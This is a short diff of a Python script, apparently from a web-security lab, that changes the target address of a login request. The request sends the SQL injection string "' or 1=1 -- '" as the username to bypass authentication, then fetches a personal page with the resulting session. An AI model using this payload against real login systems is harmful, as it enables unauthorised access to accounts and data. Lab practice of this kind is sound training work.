@@ -6,7 +6,7 @@ from bs4 import BeautifulSoup
 session = requests.Session()
 
 # 发送一个 POST 请求，并自动处理重定向
-response = session.post('http://192.168.157.138:80/login.php', data={'username': "' or 1=1 -- '", 'password': '2'})
+response = session.post('http://192.168.56.103:8000/login.php', data={'username': "' or 1=1 -- '", 'password': '2'})
 if response.status_code != 200:
     print('web error!')
     exit()
@@ -17,7 +17,7 @@ if 'alert' in response.text:
     print(matches)
     exit()
 # 发送一个 GET 请求，并自动处理重定向
-response = session.get('http://192.168.157.138:80/personal.php')
+response = session.get('http://192.168.56.103:8000/personal.php')
 
 if response.status_code != 200:
     print('web error!')
